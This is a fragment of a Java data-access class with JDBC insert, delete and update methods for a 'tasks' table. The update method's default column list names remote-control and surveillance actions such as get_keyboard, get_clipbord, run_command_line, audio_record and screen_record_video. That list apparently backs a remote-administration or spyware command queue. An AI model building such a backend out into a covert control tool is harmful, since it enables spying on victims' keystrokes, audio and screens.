    public boolean insertIntoDB(Connection conn) throws SQLException {
        String sqlStr="INSERT INTO tasks (";
        boolean ifFirst=true;
        int valColCnt=0;
        for(int i=0;i<colNames.length;i++){
            String colName = colNames[i];
            if(this.getColValue(colName)!=null || nullAL.contains(colName)){
                if(ifFirst){ifFirst=false; }else{sqlStr+=",";}
                valColCnt++;
                sqlStr+=colName;
            }
        }
        sqlStr+=") values (";
        for(int i=0;i<valColCnt;i++){
            if(i!=0) sqlStr+=",";
            sqlStr+=" ? ";
        }
        sqlStr+=")";
        PreparedStatement pStmt=null;
        try{
            pStmt=conn.prepareStatement(sqlStr);
            valColCnt=0;
            ifFirst=true;
            for(int i=0;i<colNames.length;i++){
                String colName = colNames[i];
                if(this.getColValue(colName)!=null || nullAL.contains(colName)){
                    valColCnt++;
                    if(!nullAL.contains(colName)){
                        pStmt.setObject(valColCnt,getColValue(colName));
                    }else{// user set it null
                        int colIdx = getColIdx(colName);
                        pStmt.setNull(valColCnt,getColSqlType(colIdx));
                    }
                }
            }
            pStmt.execute();
        }finally{
            try{pStmt.close();}catch(Exception e){}
        }
        this.isDirty=false;
        return true;
    }
    public boolean deleteFromDB(Connection conn) throws SQLException {
        if(id==null){return false;}
        String sqlStr="DELETE FROM tasks WHERE id=? ";
        PreparedStatement pStmt=conn.prepareStatement(sqlStr);
        pStmt.setObject(1,id);
        pStmt.execute();
        pStmt.close();
        this.isDirty=false;
        return true;
    }
    // update method
    public boolean updateDB(Connection conn) throws SQLException {
        return updateDB(conn ,"reboot","shutdown","kill_me","get_keyboard","get_taskmanger","get_clipbord","run_command_line","audio_life_phone","audio_life","audio_record","screen_record_life","screen_record_screnshot","screen_record_video","id","uuid");
    }
    public boolean updateDB(Connection conn,String... colStrs) throws SQLException {
        if(id==null){return false;}
        String sqlStr = getUpdateSQL(colStrs);
        String[] updColNames=getUpdColNames(colStrs);
        PreparedStatement pStmt=null;
        try{
            pStmt=conn.prepareStatement(sqlStr);
            for(int i=0;i<updColNames.length;i++){
                Object obj = getColValue(updColNames[i]);
                if(obj!=null) pStmt.setObject(i+1,obj);
                else pStmt.setNull(i+1, getColSqlType(getColIdx(updColNames[i])));
            }
            pStmt.setObject(updColNames.length+1,id);
            pStmt.execute();
        }finally{
            try{pStmt.close();}catch(Exception ex){}
        }
        this.isDirty=false;
        return true;
    }
    public String getUpdateSQL(String... colStrs){
        String[] updColNames=getUpdColNames(colStrs);
        String sqlStr="UPDATE tasks SET ";
        for(int i=0;i<updColNames.length;i++){
            if(i!=0) sqlStr+=", ";
            sqlStr+=updColNames[i]+"=?";
        }
        sqlStr+=" WHERE id = ? ";
        return sqlStr;
    }
    private String[] getUpdColNames(String... colStrs){
        ArrayList tmpAL=new ArrayList();
        for (String colStr : colStrs) {
            if (colStr == null) continue;
            colStr=colStr.trim();
            if("".equals(colStr)) continue;
            else if("id".equalsIgnoreCase(colStr))continue;
            if(this.getColValue(colStr)==null && !this.nullAL.contains(colStr)) continue;
            tmpAL.add(colStr);
        }
        String[] ans=new String[tmpAL.size()];
        tmpAL.toArray(ans);
        return ans;
    }
    // SQL MODIFICATION METHODS END ----------------------------------------
    // </editor-fold>//GEN-END:INSERT_DELETE_UPDATE_METHOD
    
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:OTHER_ISSUES_METHOD
    public boolean isDirty(){
        return isDirty;
    }
    public void clearDirtyFlag(){
        this.isDirty=false;
    }
    public Object getUsrObj(){
        return usrObj;
    }
    public void setUsrObj(Object usrObj){
        this.usrObj = usrObj;
    }
    // </editor-fold>//GEN-END:OTHER_ISSUES_METHOD
}
